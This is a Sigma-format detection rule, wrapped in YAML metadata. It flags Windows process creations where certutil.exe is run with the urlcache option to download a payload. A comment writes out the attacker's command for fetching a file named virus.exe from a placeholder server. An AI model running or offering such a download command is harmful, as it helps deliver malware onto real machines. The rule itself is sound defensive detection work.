id: a3b40f53-17f7-457e-b834-3be950ce235c
name: Certutil payload download (command)
description: Detects scenarios where an attacker attempts to abuse certutil command to download obfuscated malicious payload.
query: |-
    title: Certutil payload download (command)
    description: Detects scenarios where an attacker attempts to abuse certutil command to download obfuscated malicious payload.
    references:
    - https://www.elastic.co/guide/en/security/current/suspicious-certutil-commands.html
    - https://www.bleepingcomputer.com/news/security/certutilexe-could-allow-attackers-to-download-malware-while-bypassing-av/
    - https://attack.mitre.org/software/S0160/
    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
    - https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/
    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
    - https://www.recordedfuture.com/five-common-ransomware-techniques
    tags:
    - attack.defense_evasion
    - attack.t1105
    author: mdecrevoisier
    status: experimental
    logsource:
      product: windows
      category: process_creation
    detection: # Full command: "certutil -urlcache -split -f [serverURL] virus.exe"
      selection:
        NewProcessName|endswith: '\certutil.exe'
        CommandLine|contains:
          - urlcache
          #- decode    # see other related rule
          #- encodehex # see other related rule
          #- encodehex # see other related rule
          #- decodehex # see other related rule
      condition: selection
    falsepositives:
    - None
    level: high
query_type: sigma
severity: high
tactics:
    - TA0011
techniques:
    - T1105
tags:
    - attack.defense_evasion
    - attack.t1105
author: mdecrevoisier
version: "1"
references:
    - https://www.elastic.co/guide/en/security/current/suspicious-certutil-commands.html
    - https://www.bleepingcomputer.com/news/security/certutilexe-could-allow-attackers-to-download-malware-while-bypassing-av/
    - https://attack.mitre.org/software/S0160/
    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
    - https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/
    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
    - https://www.recordedfuture.com/five-common-ransomware-techniques
data_sources:
    - process_creation
    - windows
